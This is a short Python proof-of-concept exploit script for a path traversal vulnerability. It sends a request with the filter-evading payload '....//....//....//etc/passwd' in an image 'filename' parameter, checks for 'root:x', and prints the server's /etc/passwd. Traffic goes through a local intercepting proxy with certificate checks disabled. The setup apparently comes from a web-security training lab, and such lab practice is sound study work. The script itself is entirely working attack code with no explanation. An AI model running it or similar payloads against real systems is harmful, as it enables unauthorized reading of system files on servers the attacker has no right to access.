
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def directory_traversal_exploit(url):
    image_url = url +  "/image?filename=....//....//....//etc/passwd"
    r = requests.get(image_url, verify=False, proxies=proxies)
    if "root:x" in r.text:
        print("[+] exploit successful!")
        print(r.text) # if you want to see the content of /etc/passwd uncomment this line
    else:
        print("[-] exploit failed!")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("Usage: python POC.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    print(f"[*] Exploiting {url} ...")
    directory_traversal_exploit(url)


if __name__ == "__main__":
    main()